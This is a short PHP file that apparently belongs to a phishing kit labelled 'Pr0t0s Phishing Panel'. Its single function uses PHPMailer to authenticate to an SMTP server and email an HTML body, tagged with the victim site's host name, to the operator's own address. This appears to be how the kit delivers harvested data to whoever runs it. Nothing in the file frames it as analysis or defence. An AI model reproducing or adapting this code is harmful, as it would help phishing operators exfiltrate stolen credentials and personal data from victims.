<?php
function CreateEMail ($MailToAndFrom, $SMTPServer, $MailUser, $MailPassword, $HTMLBody, $HostName1) {  
   require_once '../mail/class.phpmailer.php';  
   $mail = new PHPMailer();
   $mail->IsSMTP();
   $mail->Host     = $SMTPServer;
   $mail->SMTPAuth = true;
   $mail->Username = $MailUser;
   $mail->Password = $MailPassword;
   $mail->From     = $MailToAndFrom;
   $mail->FromName = "Pr0t0s";
   $mail->AddAddress($MailToAndFrom);
   $mail->Subject  =  "Pr0t0s Phishing Panel - " . $HostName1;
   $mail->CharSet  =  "utf-8";
   $mail->IsHTML(true);
   $mail->Body  =  $HTMLBody;
   $mail->Send();
}
?>